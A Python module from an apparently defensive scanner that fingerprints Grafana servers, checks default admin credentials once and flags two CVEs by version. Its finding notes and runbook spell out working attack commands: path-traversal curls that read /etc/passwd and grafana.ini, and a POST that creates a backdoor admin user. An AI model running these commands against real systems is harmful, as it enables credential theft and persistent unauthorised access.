"""Grafana (3000/tcp) — dashboards, unauthenticated fingerprint & CVE gate.

Grafana OSS/Enterprise ships with a well-known default admin login
(admin/admin) and a rich unauthenticated fingerprint surface (login
page HTML, /api/health, /api/gnet/plugins). Internal deployments very
routinely leave the default cred in place and skip fronting the UI
behind auth-mesh — one of the most common "walk-in RCE" boxes on an
enterprise LAN.

Findings:
  * grafana_reachable (INFO, t1) — /api/health OR / returned the
    Grafana body signature (JSON `{database,version,commit}` or the
    `data-app-info` HTML meta). Fingerprint-gated: a random web app on
    3000 is NOT flagged as Grafana.
  * grafana_version (INFO→HIGH, t0) — version disclosed via
    /api/health. Severity elevates when the version parses BELOW a
    CVE-vulnerable line, so a bare fingerprint in an old fleet lights
    up on the report.
  * grafana_default_creds_admin (CRITICAL, t1) — SAFE single-shot GET
    /api/orgs with `Authorization: Basic YWRtaW46YWRtaW4=` returned
    200. Confirmed console admin. NEVER LOOPS through a credential
    list — single probe only, per project safety rules.
  * grafana_plugin_list (INFO, t0) — /api/gnet/plugins answered a
    plugin catalog without auth. Discovery signal (which datasources
    are installed → downstream CVE surface: MySQL/PG/DuckDB backends).
  * grafana_cve_2021_43798 (CRITICAL, t1) — version-gated: Grafana
    8.0.0..<8.3.1 (with per-minor backport fixes) is vulnerable to
    path traversal via the plugin URL — arbitrary file read
    (/etc/grafana/grafana.ini → admin cred, /etc/passwd, ~/.aws/*).
  * grafana_cve_2024_9264 (CRITICAL, t1) — version-gated: Grafana
    11.0.0..<11.0.6 / 11.1..<11.1.7 / 11.2..<11.2.3 / 11.3..<11.3.2
    carries a SQL injection in the DuckDB expression evaluator that
    yields RCE as the grafana user when the sqlExpressionCells feature
    is enabled.

Airgap-safe: stdlib http.client + ssl only. Bounded: at most 5
requests per target (health, root, gnet-plugins, one default-cred
probe, plus one TLS handshake retry on the initial fetch). NEVER
POSTs, NEVER attempts a login beyond the single documented
default-cred marker, NEVER exercises the traversal / SQLi endpoints
against a real target — the CVE emissions are strictly version-gated.
"""
from __future__ import annotations

import http.client
import json
import re
import ssl

from ..core.models import Host, Port


_DEFAULT_PORT = 3000
_TIMEOUT = 3.0
_UA = "recce-probe/1.0"

# base64("admin:admin") — the well-known Grafana default. Sent ONCE per
# target (and only once) to prove that the default cred still works.
# NEVER expanded into a spray list; the CLI-side auth flow refuses to
# turn this into a loop by construction.
_DEFAULT_ADMIN_BASIC = "YWRtaW46YWRtaW4="

# --- CVE gates -----------------------------------------------------------
# CVE-2021-43798 — path traversal via plugin URL. Upstream fixes:
#   8.0.7, 8.1.8, 8.2.7, 8.3.1 (per Grafana advisory GHSA-8pjx-jj86-j47p).
# Encoded as (min, exclusive_max) per vulnerable minor line so a
# backported build (8.0.7) is correctly NOT flagged.
_CVE_2021_43798_RANGES = (
    ((8, 0, 0), (8, 0, 7)),
    ((8, 1, 0), (8, 1, 8)),
    ((8, 2, 0), (8, 2, 7)),
    ((8, 3, 0), (8, 3, 1)),
)

# CVE-2024-9264 — DuckDB SQL-expression RCE. Upstream fixes:
#   11.0.6, 11.1.7, 11.2.3, 11.3.2 (per Grafana advisory GHSA-9m4f-7r43-2j2f).
_CVE_2024_9264_RANGES = (
    ((11, 0, 0), (11, 0, 6)),
    ((11, 1, 0), (11, 1, 7)),
    ((11, 2, 0), (11, 2, 3)),
    ((11, 3, 0), (11, 3, 2)),
)


def is_grafana(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid == _DEFAULT_PORT
            or "grafana" in svc or "grafana" in prod)


def _http(ip: str, port: int, method: str, path: str,
          headers: dict | None = None, timeout: float = _TIMEOUT):
    """One HTTP request. Transparently retries HTTPS if HTTP fails.
    Returns (status, headers-dict, body-bytes) or None."""
    for use_tls in (False, True):
        conn = None
        try:
            if use_tls:
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(ip, port, timeout=timeout,
                                                   context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=timeout)
            hdrs = {"User-Agent": _UA, "Connection": "close"}
            if headers:
                hdrs.update(headers)
            conn.request(method, path, headers=hdrs)
            resp = conn.getresponse()
            body = resp.read(300_000)
            hdict = {k.lower(): v for k, v in resp.getheaders()}
            return resp.status, hdict, body
        except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
            if not use_tls:
                continue
            return None
        finally:
            if conn is not None:
                try: conn.close()
                except OSError: pass
    return None


def _parse_version(ver: str) -> tuple[int, int, int] | None:
    """Parse a Grafana version string ('8.3.0', 'v11.2.2', '10.4.1-security-01')
    into a comparable 3-tuple. Returns None when the string isn't
    dotted-numeric enough — the CVE gates then stay silent rather than
    false-flag on a rewritten / unknown build."""
    if not ver or not isinstance(ver, str):
        return None
    m = re.match(r"v?(\d+)\.(\d+)\.(\d+)", ver.strip())
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def _in_range(v: tuple[int, int, int],
              ranges: tuple[tuple[tuple[int, int, int],
                                  tuple[int, int, int]], ...]) -> bool:
    """True iff v falls inside any [lo, hi) window in `ranges`."""
    for lo, hi in ranges:
        if lo <= v < hi:
            return True
    return False


def _looks_grafana_body(body: bytes) -> bool:
    """HTML root ('/') fingerprint: Grafana ships a <meta name="viewport">
    plus a distinctive `data-app-info` attribute on <script>, and the word
    'grafana' appears throughout the login shell. A random web app that
    happens to contain 'grafana' as a substring but no HTML shell is not
    flagged (require both signals for the root-page path)."""
    txt = body[:60_000].decode("utf-8", "replace").lower()
    if "data-app-info" in txt:
        return True
    # Fallback: 'grafana' + a login/app hint in the same document.
    return "grafana" in txt and ("<title>grafana" in txt or
                                 "id=\"reactroot\"" in txt or
                                 "app_subUrl" in txt or
                                 "app_sub_url" in txt)


def _probe_health(ip: str, port: int, timeout: float) -> dict:
    """GET /api/health — Grafana's canonical JSON fingerprint:
    {"commit":"...","database":"ok","version":"11.2.2"}. Returns
    {"reachable": bool, "version": str, "database": str, "commit": str}."""
    out = {"reachable": False, "version": "", "database": "", "commit": ""}
    r = _http(ip, port, "GET", "/api/health", timeout=timeout)
    if r is None or r[0] != 200:
        return out
    body = r[2]
    try:
        j = json.loads(body.decode("utf-8", "replace"))
    except (ValueError, UnicodeDecodeError):
        return out
    if not isinstance(j, dict):
        return out
    ver = j.get("version")
    db = j.get("database")
    commit = j.get("commit")
    # A random JSON API might have a "version" key too — require BOTH
    # `database` (ok/failing/...) and `version` so we don't flag every
    # /api/health lookalike as Grafana.
    if not isinstance(ver, str) or not isinstance(db, str):
        return out
    if not (0 < len(ver) < 64 and "." in ver):
        return out
    out["reachable"] = True
    out["version"] = ver.strip()[:64]
    out["database"] = db.strip()[:32]
    out["commit"] = str(commit or "").strip()[:80] if commit else ""
    return out


def _probe_root(ip: str, port: int, timeout: float) -> bool:
    """GET / — HTML login shell as a fingerprint fallback when
    /api/health is blocked by a fronting proxy. Returns True iff the
    body carries the Grafana app-info signature."""
    r = _http(ip, port, "GET", "/", timeout=timeout)
    if r is None:
        return False
    # Grafana serves the SPA shell on 200 OR a 302 to /login. Accept the
    # 200 body directly; on 302 follow one hop to /login.
    status, _hdrs, body = r
    if status == 200 and _looks_grafana_body(body):
        return True
    if status in (301, 302, 303, 307, 308):
        r2 = _http(ip, port, "GET", "/login", timeout=timeout)
        if r2 is not None and r2[0] == 200 and _looks_grafana_body(r2[2]):
            return True
    return False


def _probe_gnet_plugins(ip: str, port: int, timeout: float) -> dict:
    """GET /api/gnet/plugins — legacy plugin catalog proxy. On older
    Grafana this is served without auth. Returns
    {"exposed": bool, "count": int, "plugins": [str, ...]}."""
    out = {"exposed": False, "count": 0, "plugins": []}
    r = _http(ip, port, "GET", "/api/gnet/plugins", timeout=timeout)
    if r is None or r[0] != 200:
        return out
    try:
        j = json.loads(r[2].decode("utf-8", "replace"))
    except (ValueError, UnicodeDecodeError):
        return out
    items = j.get("items") if isinstance(j, dict) else None
    if not isinstance(items, list):
        return out
    names: list[str] = []
    for it in items[:15]:
        if isinstance(it, dict):
            name = it.get("slug") or it.get("name") or ""
            if isinstance(name, str) and name:
                names.append(name[:80])
    out["exposed"] = True
    out["count"] = len(items)
    out["plugins"] = names
    return out


def _probe_default_cred(ip: str, port: int, timeout: float) -> dict:
    """SAFE single-shot admin:admin marker probe against GET /api/orgs.
    NEVER loops through a credential list — one request only, and only
    the pre-encoded default `admin:admin` Basic value. Returns
    {"accepted": bool, "status": int}."""
    out = {"accepted": False, "status": 0}
    r = _http(ip, port, "GET", "/api/orgs", timeout=timeout,
              headers={"Authorization": f"Basic {_DEFAULT_ADMIN_BASIC}"})
    if r is None:
        return out
    status, _hdrs, body = r
    out["status"] = status
    if status != 200:
        return out
    # 200 alone is not enough — some proxies mask 401 as 200 with an
    # error body. Require the JSON list-of-orgs shape Grafana returns.
    try:
        j = json.loads(body.decode("utf-8", "replace"))
    except (ValueError, UnicodeDecodeError):
        return out
    if isinstance(j, list) and (not j or isinstance(j[0], dict) and "id" in j[0]):
        out["accepted"] = True
    return out


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    """Single-target Grafana probe. Returns
    {reachable, version, database, commit, plugin_list_exposed,
     plugin_count, plugins, default_admin_creds, default_creds_status,
     cve_2021_43798, cve_2024_9264}."""
    out: dict = {
        "reachable": False, "version": "", "database": "", "commit": "",
        "plugin_list_exposed": False, "plugin_count": 0, "plugins": [],
        "default_admin_creds": False, "default_creds_status": 0,
        "cve_2021_43798": False, "cve_2024_9264": False,
    }
    # Canonical fingerprint via /api/health JSON.
    health = _probe_health(ip, port, timeout)
    if health["reachable"]:
        out["reachable"] = True
        out["version"] = health["version"]
        out["database"] = health["database"]
        out["commit"] = health["commit"]
    else:
        # Fallback: HTML login-shell fingerprint. No version comes back
        # from this path, so CVE gates simply stay quiet.
        if _probe_root(ip, port, timeout):
            out["reachable"] = True

    if not out["reachable"]:
        return out

    # CVE gates — version-parseable AND in a vulnerable window.
    parsed = _parse_version(out["version"]) if out["version"] else None
    if parsed is not None:
        if _in_range(parsed, _CVE_2021_43798_RANGES):
            out["cve_2021_43798"] = True
        if _in_range(parsed, _CVE_2024_9264_RANGES):
            out["cve_2024_9264"] = True

    # Additive: unauthenticated plugin catalog leak.
    gnet = _probe_gnet_plugins(ip, port, timeout)
    if gnet["exposed"]:
        out["plugin_list_exposed"] = True
        out["plugin_count"] = gnet["count"]
        out["plugins"] = gnet["plugins"]

    # SAFE single-shot default-cred marker. One request, one hard-coded
    # credential, no loop.
    dc = _probe_default_cred(ip, port, timeout)
    out["default_creds_status"] = dc["status"]
    if dc["accepted"]:
        out["default_admin_creds"] = True

    return out


def grafana_targets(hosts: list[Host]) -> list[dict]:
    """Module-scope (matches the _module_scoped_check qualname rule —
    NOT nested inside a class)."""
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_grafana(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


_NARRATIVE = {
    "grafana_reachable": (
        "Grafana answered the canonical fingerprint (either /api/health "
        "JSON with a version+database key, or the login shell's "
        "data-app-info HTML meta). An internet- or LAN-reachable Grafana "
        "is the classic 'walk-in' dashboarding surface: default admin "
        "cred is admin/admin, /api/gnet/plugins often answers unauth on "
        "older builds, and several years of RCE/traversal CVEs sit "
        "directly behind /api/plugins and /api/ds."),
    "grafana_version": (
        "The build string was disclosed on GET /api/health. Used to gate "
        "CVE emission (8.0..<8.3.1 => CVE-2021-43798 arbitrary file read; "
        "11.0..<11.0.6 / 11.1..<11.1.7 / 11.2..<11.2.3 / 11.3..<11.3.2 "
        "=> CVE-2024-9264 DuckDB SQLi RCE) and to feed the offline "
        "version→CVE mapping."),
    "grafana_default_creds_admin": (
        "Grafana accepted the default admin/admin credential on GET "
        "/api/orgs (single-shot probe — recce NEVER sprays). Full console "
        "control: create new admin users, add datasources (pivot into "
        "internal DBs), edit dashboards that other engineers view (XSS/"
        "SSRF pivot), and — depending on version — reach RCE via SQLi "
        "against enabled datasources."),
    "grafana_plugin_list": (
        "GET /api/gnet/plugins returned the plugin catalog without auth. "
        "Confirms the pluginList is unauthenticated (older Grafana "
        "default) and enumerates the installed datasource plugins — "
        "reconnaissance for follow-on CVE targeting (Grafana MySQL / PG "
        "/ DuckDB / InfluxDB backends each carry their own exploit "
        "surface once you know they're wired in)."),
    "grafana_cve_2021_43798": (
        "Version-gated: the disclosed build sits inside the "
        "CVE-2021-43798 window (Grafana 8.0.0..<8.3.1 with per-minor "
        "backport fixes 8.0.7 / 8.1.8 / 8.2.7 / 8.3.1). Path traversal "
        "via the plugin URL — GET /public/plugins/<plugin>/../../../../"
        "etc/passwd returns the file. High-value reads: /etc/grafana/"
        "grafana.ini (admin_password), /var/lib/grafana/grafana.db "
        "(session store), and ~/.aws/credentials on the grafana user."),
    "grafana_cve_2024_9264": (
        "Version-gated: the disclosed build sits inside the "
        "CVE-2024-9264 window (11.0..<11.0.6 / 11.1..<11.1.7 / "
        "11.2..<11.2.3 / 11.3..<11.3.2). SQL injection in the DuckDB "
        "expression evaluator — a low-privileged user (Viewer) can send "
        "a crafted /api/ds/query payload with an sqlExpressionCells "
        "block that shells out via DuckDB's read_csv → RCE as the "
        "grafana OS user."),
}


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "curl", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_grafana(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("version") or "?"

            # T1 headline: Grafana reachable.
            out.append(_finding(
                "info",
                "Grafana dashboards reachable", tgt,
                f"Grafana {ver} answered the canonical fingerprint "
                f"(/api/health JSON or the login shell's data-app-info "
                f"HTML meta). Default admin credential is admin/admin; "
                f"several exploitable CVEs (CVE-2021-43798 file-read, "
                f"CVE-2024-9264 DuckDB SQLi RCE) sit directly behind the "
                f"same listener. Confirm the admin cred was rotated and "
                f"the build is patched.",
                f"curl -sk http://{h.ip}:{p.portid}/api/health",
                "Front Grafana with an authenticating reverse proxy or "
                "gate it behind an SSO/mesh so the admin console is not "
                "network-reachable. Rotate the initial admin password on "
                "first boot; disable the /api/gnet/plugins passthrough "
                "if it is not needed.",
                ["CWE-200"], kind="grafana_reachable",
                exploit_note=(
                    "curl -sk http://<ip>:3000/api/health; "
                    "curl -sk -u admin:admin http://<ip>:3000/api/orgs"),
                depth_tier="t1"))

            # Version disclosure — severity elevates on a CVE match so
            # the report surfaces old fleets even on the info row.
            if pr.get("version"):
                elev = pr.get("cve_2021_43798") or pr.get("cve_2024_9264")
                out.append(_finding(
                    "high" if elev else "info",
                    "Grafana version disclosed", tgt,
                    f"GET /api/health returned "
                    f"{{\"version\":\"{ver}\",\"database\":\""
                    f"{pr.get('database', '?')}\"}}. Recorded for "
                    f"offline version→CVE mapping."
                    + (" Version falls in a KNOWN-VULNERABLE window."
                       if elev else ""),
                    f"curl -sk http://{h.ip}:{p.portid}/api/health",
                    "Not directly fixable; version disclosure is inherent "
                    "to /api/health. Front with auth so the endpoint is "
                    "not reachable.",
                    [], kind="grafana_version",
                    exploit_note=(
                        "curl -sk http://<ip>:3000/api/health | jq .version"),
                    depth_tier="t0"))

            # SAFE default-cred marker.
            if pr.get("default_admin_creds"):
                out.append(_finding(
                    "critical",
                    "Grafana default admin credential (admin/admin) "
                    "accepted", tgt,
                    f"A single-shot GET /api/orgs with "
                    f"`Authorization: Basic {_DEFAULT_ADMIN_BASIC}` "
                    f"(admin:admin) returned HTTP 200 with the Grafana "
                    f"organisations list. Confirmed console admin. From "
                    f"here: create a persistent admin user (POST "
                    f"/api/admin/users), add attacker-controlled "
                    f"datasources (SSRF/DB pivot), edit dashboards other "
                    f"engineers view (XSS/session hijack), and — on a "
                    f"vulnerable build — trigger CVE-2024-9264 "
                    f"(sqlExpressionCells RCE).",
                    f"curl -sk -u admin:admin "
                    f"http://{h.ip}:{p.portid}/api/orgs",
                    "Rotate the initial admin password on first boot "
                    "(env: GF_SECURITY_ADMIN_PASSWORD or the CLI "
                    "`grafana-cli admin reset-admin-password`). Enable "
                    "SSO where possible. Front the console with an "
                    "authenticating proxy so a wrong-cred rotation "
                    "doesn't leave the box wide open.",
                    ["CWE-798", "CWE-521", "CWE-287"],
                    kind="grafana_default_creds_admin",
                    exploit_note=(
                        "curl -sk -u admin:admin http://<ip>:3000/api/orgs; "
                        "curl -sk -u admin:admin -H 'Content-Type: "
                        "application/json' -X POST http://<ip>:3000/api/"
                        "admin/users -d '{\"name\":\"pwn\",\"login\":\"pwn"
                        "\",\"password\":\"P@ssw0rd1\"}'"),
                    depth_tier="t1"))

            # Public plugin list — pure info.
            if pr.get("plugin_list_exposed"):
                plugins = pr.get("plugins") or []
                names_txt = ", ".join(plugins[:8]) or "(no names decoded)"
                more = "" if pr.get("plugin_count", 0) <= 8 else (
                    f" (+{pr['plugin_count'] - 8} more)")
                out.append(_finding(
                    "info",
                    "Grafana /api/gnet/plugins readable without auth", tgt,
                    f"GET /api/gnet/plugins returned "
                    f"{pr.get('plugin_count', 0)} plugin entry(ies) "
                    f"without authentication: {names_txt}{more}. "
                    f"Confirms the gnet passthrough is unauth on this "
                    f"build — enumerates installed datasources so a "
                    f"downstream CVE (MySQL/PG/DuckDB) can be targeted "
                    f"once console access is obtained.",
                    f"curl -sk http://{h.ip}:{p.portid}/api/gnet/plugins",
                    "Disable the /api/gnet/plugins passthrough if "
                    "plugin discovery from the UI is not required.",
                    ["CWE-200"], kind="grafana_plugin_list",
                    exploit_note=(
                        "curl -sk http://<ip>:3000/api/gnet/plugins | jq "
                        "'.items[].slug'"),
                    depth_tier="t0"))

            # CVE-2021-43798 — version-gated, path-traversal file read.
            if pr.get("cve_2021_43798"):
                out.append(_finding(
                    "critical",
                    "Grafana CVE-2021-43798 (8.0..<8.3.1): plugin URL "
                    "path traversal (arbitrary file read)", tgt,
                    f"Disclosed version {ver} is in the CVE-2021-43798 "
                    f"vulnerable window (Grafana 8.0.0..<8.3.1, with "
                    f"per-minor fixes 8.0.7 / 8.1.8 / 8.2.7 / 8.3.1). "
                    f"Path traversal via /public/plugins/<plugin>/../../ "
                    f"reads any file the grafana OS user can read — "
                    f"including /etc/grafana/grafana.ini (contains the "
                    f"admin password and DB creds), /var/lib/grafana/"
                    f"grafana.db (session/user store), and ~/.aws/"
                    f"credentials.",
                    f"curl -sk 'http://{h.ip}:{p.portid}/public/plugins/"
                    "alertlist/..%2f..%2f..%2f..%2fetc%2fpasswd'",
                    "Upgrade to Grafana 8.3.1 (or the backport fix for "
                    "the relevant minor: 8.0.7 / 8.1.8 / 8.2.7). Once "
                    "patched, rotate the admin_password and any "
                    "datasource creds that appeared in grafana.ini — "
                    "assume they were read.",
                    ["CWE-22", "CWE-200"], kind="grafana_cve_2021_43798",
                    exploit_note=(
                        "for p in alertlist mysql postgres; do curl -sk "
                        "\"http://<ip>:3000/public/plugins/$p/..%2f..%2f"
                        "..%2f..%2fetc%2fgrafana%2fgrafana.ini\" | head; "
                        "done"),
                    depth_tier="t1"))

            # CVE-2024-9264 — version-gated, DuckDB SQLi -> RCE.
            if pr.get("cve_2024_9264"):
                out.append(_finding(
                    "critical",
                    "Grafana CVE-2024-9264 (11.0..<11.0.6 / 11.1..<11.1.7 "
                    "/ 11.2..<11.2.3 / 11.3..<11.3.2): DuckDB SQL "
                    "injection (RCE)", tgt,
                    f"Disclosed version {ver} is in the CVE-2024-9264 "
                    f"vulnerable window. The sqlExpressionCells feature "
                    f"passes user input into DuckDB without escaping — "
                    f"any authenticated user (including a low-priv "
                    f"Viewer) can send a crafted /api/ds/query payload "
                    f"that shells out via DuckDB's read_csv function, "
                    f"resulting in RCE as the grafana OS user. Combines "
                    f"badly with default admin/admin (or a public sign-up "
                    f"org) — reachable without any prior compromise.",
                    f"curl -sk http://{h.ip}:{p.portid}/api/health",
                    "Upgrade to the fixed release for your minor line: "
                    "11.0.6 / 11.1.7 / 11.2.3 / 11.3.2. As a stopgap, "
                    "disable the sqlExpressionCells feature toggle and "
                    "restrict who can create dashboards/queries.",
                    ["CWE-89", "CWE-284"], kind="grafana_cve_2024_9264",
                    exploit_note=(
                        "Version in vulnerable window; public PoCs "
                        "(Grafana security advisory GHSA-9m4f-7r43-2j2f). "
                        "Requires a valid session — chain with "
                        "grafana_default_creds_admin when present."),
                    depth_tier="t1"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Health + version fingerprint",
         "cmd": f"curl -sk http://{ip}:{port}/api/health"},
        {"step": "Login page (data-app-info HTML fallback)",
         "cmd": f"curl -sk http://{ip}:{port}/login | grep -o 'data-app-info[^>]*'"},
        {"step": "Public plugin catalog (unauth on older builds)",
         "cmd": f"curl -sk http://{ip}:{port}/api/gnet/plugins"},
        {"step": "SAFE default-cred marker (single-shot, DO NOT loop)",
         "cmd": f"curl -sk -u admin:admin http://{ip}:{port}/api/orgs"},
        {"step": "CVE-2021-43798 arbitrary file read (destructive: PoC)",
         "cmd": (f"curl -sk 'http://{ip}:{port}/public/plugins/alertlist/"
                 "..%2f..%2f..%2f..%2fetc%2fpasswd'")},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "grafana", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = grafana_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["version"] = pr.get("version", "")
                t["default_admin_creds"] = pr.get("default_admin_creds", False)
                t["plugin_list_exposed"] = pr.get("plugin_list_exposed", False)
                t["cve_2021_43798"] = pr.get("cve_2021_43798", False)
                t["cve_2024_9264"] = pr.get("cve_2024_9264", False)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
